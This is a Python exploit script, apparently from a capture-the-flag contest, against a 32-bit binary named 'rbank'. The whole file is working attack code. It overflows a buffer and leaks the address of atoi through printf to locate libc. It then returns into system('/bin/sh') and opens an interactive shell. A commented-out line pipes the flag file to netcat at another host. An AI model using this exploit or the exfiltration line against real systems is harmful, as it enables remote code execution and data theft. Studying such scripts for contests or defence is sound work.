#!/usr/bin/env python
# coding:utf-8

from ctf import *

context.log_level = 'debug'

# io = remote('172.16.5.{}'.format(args['ID']), 8888)
# io = process('./rbank')
io = remote('0.0.0.0', 4000)

elf = ELF('./rbank')
libc = ELF('./libc.so.6')
g_buf = 0x0804AB00
start_addr = 0x08048750

io.recvuntil('bank')
io.sendline(2)
payload = cyclic(0x404)
fake_account_off = 0x430
payload += p32(g_buf + fake_account_off)
payload += cyclic(12)
payload += cyclic(4) # rbp
payload += p32(elf.plt['printf']) # return address
payload += p32(start_addr)
payload += p32(elf.got['atoi'])
payload = ljust(payload, fake_account_off)
payload += cyclic(204) + p32(g_buf + 1) + cyclic(4)
assert payload.find('\0') == -1
assert payload.find('\n') == -1
io.sendline(payload[:-1])

io.recvline_endswith('error:there is no such account')
atoi_addr = u32(io.recv(4))
libc_base = atoi_addr - libc.symbols['atoi']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
log.info('atoi address: {:#x}'.format(atoi_addr))
log.info('libc base address: {:#x}'.format(libc_base))
log.info('system address: {:#x}'.format(system_addr))
log.info('/bin/sh address: {:#x}'.format(binsh_addr))

io.sendline(2)
payload = cyclic(0x404)
fake_account_off = 0x440
payload += p32(g_buf + fake_account_off)
payload += cyclic(12)
payload += cyclic(4) # rbp
payload += p32(system_addr) # return address
payload += p32(start_addr)
payload += p32(binsh_addr)
# payload += p32(g_buf + fake_account_off - 0x10)
# payload = ljust(payload, fake_account_off - 0x10)
# payload += 'id>/tmp/log#'
payload = ljust(payload, fake_account_off)
payload += cyclic(204) + p32(g_buf + 1) + cyclic(4)
assert payload.find('\0') == -1
assert payload.find('\n') == -1
io.sendline(payload[:-1])

# io.sendline('cat /home/flag/flag | nc 172.16.5.19 20007')

io.interactive()
